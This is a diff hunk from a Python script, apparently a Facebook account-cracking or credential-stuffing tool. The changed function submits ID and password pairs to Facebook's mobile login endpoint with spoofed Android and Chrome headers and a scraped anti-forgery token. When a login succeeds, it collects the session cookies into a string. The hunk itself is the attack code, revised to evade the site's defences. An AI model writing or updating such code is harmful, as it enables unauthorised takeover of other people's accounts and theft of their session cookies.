@@ -1216,24 +1216,31 @@ def m6(idf,pw):
             "email":idf,
             "pass":ps,
             "login":"Log In"}
-   header_freefb = {
-            'authority': 'm.facebook.com',
-            'method': 'GET',
-            'path': '/login/device-based/login/async/',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;',
-            'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'en-US,en;q=0.9',
-            'referer': 'https://m.facebook.com',
+   header_freefb = {'Host': f'm.facebook.com',
+            'Connection': 'keep-alive',
+            'Content-Length': '{len(str(logn_data))}',
             'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'FBAN/FB4A;FBAV/314.0.0.0.78;FBAV/24.0.0.5247;FBBV/4082249;FBAN/FB4A;FBAV/304.0.0.0.68;FBAV/24.0.0.5247;FBBV/4082249;FBDM/{density=1.0,width=360,height=780};FBLC/fr_FR;FBRV/471660229;FBCR/Reach Mobile;FBMF/Google Assistant (2027);FBBD/Google Clips;com.facebook.katana;FBDV/Nextbit Robin 3;FBSV/39;FBOP/172;FBAN/FB4A;FBAV/415.0.0.34.107;FBBV/475722615;FBDM/{density=2.7875001,width=1080,height=2165};FBLC/es_LA;FBRV/478477801;'}
-   lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/',data=log_data,headers=header_freefb).text
+            'sec-ch-ua-model': '"CPH2389"',
+            'sec-ch-ua-mobile': '?1',
+            'User-Agent': ua1,
+            'viewport-width': '400',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'X-FB-LSD': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'sec-ch-ua-platform-version': '"9.7.1"',
+            'X-ASBD-ID': '129477',
+            'dpr': '1.8',
+            'sec-ch-ua-full-version-list': '"Google Chrome";v="105.0.5195.136", "Not)A;Brand";v="8.0.0.0", "Chromium";v="105.0.5195.136"',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua-platform': '"Android"',
+            'Accept': '*/*',
+            'Origin': f'https://m.facebook.com',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Dest': 'empty',
+            'Referer': f'https://m.facebook.com/',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',}
+   lo = session.post('https://m.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
